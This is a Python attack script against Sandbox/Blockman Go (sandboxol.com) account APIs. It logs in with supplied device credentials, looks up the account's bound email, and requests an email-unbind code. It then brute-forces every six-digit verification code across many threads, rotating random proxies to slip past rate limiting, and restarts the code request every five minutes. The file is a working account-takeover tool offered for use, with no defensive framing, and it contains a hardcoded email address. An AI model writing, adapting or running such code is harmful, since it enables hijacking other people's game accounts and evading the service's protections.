import requests
import json
import threading
import time
import random
import sys

# Load proxies from "data.txt"
with open('data.txt', 'r') as file:
    proxies = file.read().splitlines()

host = 'http://modsgs.sandboxol.com/'
Running = True
NoEmail = False
Authorization = False

## Enter account Id, Device Id, and Sign
userId = '982222960'
deviceId = 'your_device_id_here'
deviceSign = 'your_sign_here'
email = "neverendblockmango@gmail.com"

url_Login = "http://route.sandboxol.com/user/api/v3/app/auth-token"

headerLogin = {"bmg-device-Id": deviceId,
               "bmg-sign": deviceSign,
               "bmg-user-Id": userId,
               }

def send_request_with_random_proxy(url, headers):
    try:
        # Get a random proxy for the request
        proxy = random.choice(proxies)

        response = requests.get(url, headers=headers, proxies={'http': proxy, 'https': proxy})

        # If the response status code is not 200, switch to another random proxy and retry
        while response.status_code != 200:
            print(f"Request failed with proxy: {proxy}. Retrying...")
            proxy = random.choice(proxies)
            response = requests.get(url, headers=headers, proxies={'http': proxy, 'https': proxy})

        # Print the request URL and response content when a successful response is obtained
        url_with_params = url + '?' + '&'.join([f'{key}={value}' for key, value in headers.items()])
        print(f"Request sent: {url_with_params}")
        print("Response from API:")
        print(response.text)

        return response

    except requests.exceptions.RequestException as e:
        # Handle connection errors or proxy-related issues
        print(f"Proxy error: {proxy}. Exception: {e}")
        return None

response = send_request_with_random_proxy(url_Login, headerLogin)

if response is not None and response.status_code == 200:
    parsed_json = json.loads(response.text)
    data = parsed_json["data"]
    userId = data["userId"]

    parsed_json2 = json.loads(response.text)
    data = parsed_json2["data"]
    accessToken = data["accessToken"]

    Authorization = True

url = f"{host}/user/api/v2/user/details/info"

header = {"userId": userId,
          "Access-Token": accessToken,
          }

response = send_request_with_random_proxy(url, header)

if response is not None and response.status_code == 200:
    parsed_json3 = json.loads(response.text)
    data = parsed_json3["data"]
    email = data["email"]

    print(email)

url_Code = f'http://modsgs.sandboxol.com/user/api/v1/emails/verify/{email}?unbindType=1'

headerCode = {"userId": userId,
              "Access-Token": accessToken,
              }

response = send_request_with_random_proxy(url_Code, headerCode)

if response is not None:
    print(response.status_code)
    print(response.json())
    NoEmail = response.status_code != 200


def Zeyrum_function():

    global Running
    global NoEmail
    global Authorization

    remove_url = f"http://modsgs.sandboxol.com/user/api/v2/users/{userId}/emails?email={email}&verifyCode={str(i)}"

    headers = {
        "Access-Token": accessToken,
        "userId": userId
    }

    response = send_request_with_random_proxy(remove_url, headers)
    info = json.loads(response.text)
    code = info["code"]

    if response.status_code == 200:
        info = json.loads(response.text)
        code = info["code"]

        if code == 1:
            Running = False

        if code == 115:
            NoEmail = True

    if response.status_code == 401:
        Authorization = False


start_time = time.time()
time_limit = 300

print('Currently Running...')

for i in range(120000, 999999):
    t = threading.Thread(target=Zeyrum_function)
    t.start()
    elapsed_time = time.time() - start_time
    print(str(i))

    if Running is False:
        print(str(i))
        print("SUCCESS!!!!")
        break

    if elapsed_time >= time_limit:
        verify_url = f'{host}/user/api/v1/emails/verify/{email}?unbindType=1'

        headerCode = {"userId": userId,
                      "Access-Token": accessToken,
                      }

        response = send_request_with_random_proxy(verify_url, headerCode)

        if response is not None:
            print(response.status_code)
            print(response.json())
        start_time = time.time()

    if NoEmail is True:
        print('User does not have an email binded.')
        break

    if Authorization is False:
        print('ACCESS TOKEN EXPIRED')
        break

if i == 999999:
    print('Unsuccessful')

sys.exit()
